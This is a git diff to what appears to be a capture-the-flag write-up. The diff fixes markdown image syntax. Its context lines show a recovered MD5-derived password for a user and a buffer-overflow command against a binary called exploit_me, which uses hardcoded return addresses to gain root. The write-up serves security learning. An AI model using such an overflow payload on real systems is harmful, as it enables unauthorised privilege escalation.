@@ -225,7 +225,8 @@ Towards the end of the file, it says:
 We deduce that we should compute an MD5 digest of the message. This gives us
 `646da671ca01bb5d84dbb5fb2238dc8e` as a password for zaz.
 
-[super nickel](figs/super_nickel.gif)
+![super nickel](figs/super_nickel.gif)
+
 Super nickel !
 
 ## Step 8 - Piscine a débordement
@@ -242,7 +243,8 @@ This leads us to the following shellcode:
 ./exploit_me `python -c "print('A' * 140 + '\x60\xb0\xe6\xb7AAAA\x58\xcc\xf8\xb7')"`
 ```
 
-[cpt](figs/cpt.gif)
+![cpt](figs/cpt.gif)
+
 And voila, we are root.
 
 ## Sources
